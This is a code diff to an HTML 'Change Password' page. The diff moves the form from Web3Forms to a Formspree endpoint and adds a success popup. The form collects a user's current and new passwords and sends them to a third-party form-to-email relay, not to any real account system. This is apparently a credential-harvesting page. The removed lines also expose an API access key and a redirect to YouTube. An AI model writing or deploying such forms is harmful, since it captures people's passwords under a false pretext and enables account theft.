@@ -13,14 +13,9 @@
 <body>
   <section>
     <div class="login-box">
-      <form id="changePasswordForm" action="https://api.web3forms.com/submit" method="POST">
+      <!-- Formspree Integration -->
+      <form id="changePasswordForm" action="https://formspree.io/f/mjkeqqnr" method="POST">
         <h2>Change Password</h2>
-
-        <!-- Web3Forms Hidden Inputs -->
-        <input type="hidden" name="access_key" value="ce3a36e5-fbb8-4008-9d70-f5ad1faff978">
-        <input type="hidden" name="from_name" value="Mission Control">
-        <input type="hidden" name="subject" value="Password Change Request">
-        <input type="hidden" name="redirect" value="https://www.youtube.com">
 
         <div class="input-box">
           <input type="text" name="currentPassword" required>
@@ -44,13 +39,16 @@
           </label>
         </div>
 
+        <!-- Formspree requires an email field to send submission -->
+        <input type="hidden" name="_subject" value="Password Change Request">
+
         <button type="submit"><b>Change Password</b></button>
       </form>
     </div>
   </section>
 
   <script>
-    // Terms & Conditions Popup
+    // Terms & Conditions popup
     function showTerms(e) {
       e.preventDefault();
       Swal.fire({
@@ -68,21 +66,28 @@
       });
     }
 
-    // Form validation for matching passwords
+    // Form validation: check if passwords match
     document.getElementById("changePasswordForm").addEventListener("submit", function (e) {
       let newPass = document.getElementById("newPassword").value;
       let retypePass = document.getElementById("retypePassword").value;
 
       if (newPass !== retypePass) {
-        e.preventDefault(); // ফর্ম সাবমিট থামাও
+        e.preventDefault(); // stop submission
         Swal.fire({
           title: "Error!",
           text: "New Password and Retype Password do not match.",
           icon: "error",
           confirmButtonText: "OK"
         });
+      } else {
+        // Optional: show success alert (will still submit the form to Formspree)
+        Swal.fire({
+          title: "Success!",
+          text: "Your password change request has been submitted.",
+          icon: "success",
+          confirmButtonText: "OK"
+        });
       }
-      // যদি মিলে যায়, ফর্ম Web3Forms এ যাবে
     });
   </script>
 </body>
